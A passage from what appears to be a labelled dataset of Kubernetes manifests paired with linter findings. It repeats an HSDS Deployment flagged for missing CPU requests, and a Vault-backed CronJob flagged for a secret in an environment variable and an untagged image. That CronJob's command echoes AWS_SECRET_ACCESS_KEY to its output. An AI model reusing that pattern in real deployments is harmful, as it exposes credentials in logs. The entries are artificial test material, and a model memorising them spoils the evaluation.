AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dn2\" has cpu request 0"
  },
  {
    "id": "2801",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dn3\" has cpu request 0"
  },
  {
    "id": "2802",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"dn4\" has cpu request 0"
  },
  {
    "id": "2803",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"head\" has cpu request 0"
  },
  {
    "id": "2804",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rangeget\" has cpu request 0"
  },
  {
    "id": "2805",
    "manifest_path": "data/manifests/the_stack_sample/sample_0793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: hsds\n  name: hsds\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: hsds\n  template:\n    metadata:\n      labels:\n        app: hsds\n    spec:\n      containers:\n      - name: head\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 512M\n          limits:\n            memory: 512M\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5100\n        env:\n        - name: NODE_TYPE\n          value: head_node\n      - name: sn\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 1G\n          limits:\n            memory: 1G\n        volumeMounts:\n        - name: accounts\n          mountPath: /config/passwd.txt\n          subPath: passwd.txt\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 5101\n        env:\n        - name: NODE_TYPE\n          value: sn\n        - name: PASSWORD_FILE\n          value: /config/passwd.txt\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn1\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6101\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6101'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn2\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6102\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6102'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn3\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6103\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6103'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: dn4\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6104\n        env:\n        - name: NODE_TYPE\n          value: dn\n        - name: DN_PORT\n          value: '6104'\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      - name: rangeget\n        image: hdfgroup/hsds:v0.7.0beta6\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            memory: 2G\n          limits:\n            memory: 2G\n        volumeMounts:\n        - name: config\n          mountPath: /config\n        ports:\n        - containerPort: 6900\n        env:\n        - name: NODE_TYPE\n          value: rangeget\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_access_key_id\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-auth-keys\n              key: aws_secret_access_key\n      volumes:\n      - name: accounts\n        secret:\n          secretName: user-password\n      - name: config\n        configMap:\n          name: hsds-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sn\" has cpu request 0"
  },
  {
    "id": "2806",
    "manifest_path": "data/manifests/the_stack_sample/sample_0794.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app.kubernetes.io/name: hello-secrets\n        annotations:\n          vault.security.banzaicloud.io/vault-addr: https://vault:8200\n          vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n      spec:\n        containers:\n        - name: alpine\n          image: alpine\n          command:\n          - sh\n          - -c\n          - echo $AWS_SECRET_ACCESS_KEY\n          env:\n          - name: AWS_SECRET_ACCESS_KEY\n            value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable AWS_SECRET_ACCESS_KEY in container \"alpine\" found"
  },
  {
    "id": "2807",
    "manifest_path": "data/manifests/the_stack_sample/sample_0794.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app.kubernetes.io/name: hello-secrets\n        annotations:\n          vault.security.banzaicloud.io/vault-addr: https://vault:8200\n          vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n      spec:\n        containers:\n        - name: alpine\n          image: alpine\n          command:\n          - sh\n          - -c\n          - echo $AWS_SECRET_ACCESS_KEY\n          env:\n          - name: AWS_SECRET_ACCESS_KEY\n            value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"alpine\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2808",
    "manifest_path": "data/manifests/the_stack_sample/sample_0794.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app.kubernetes.io/name: hello-secrets\n        annotations:\n          vault.security.banzaicloud.io/vault-addr: https://vault:8200\n          vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n      spec:\n        containers:\n        - name: alpine\n          image: alpine\n          command:\n          - sh\n          - -c\n          - echo $AWS_SECRET_ACCESS_KEY\n          env:\n          - name: AWS_SECRET_ACCESS_KEY\n            value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n",
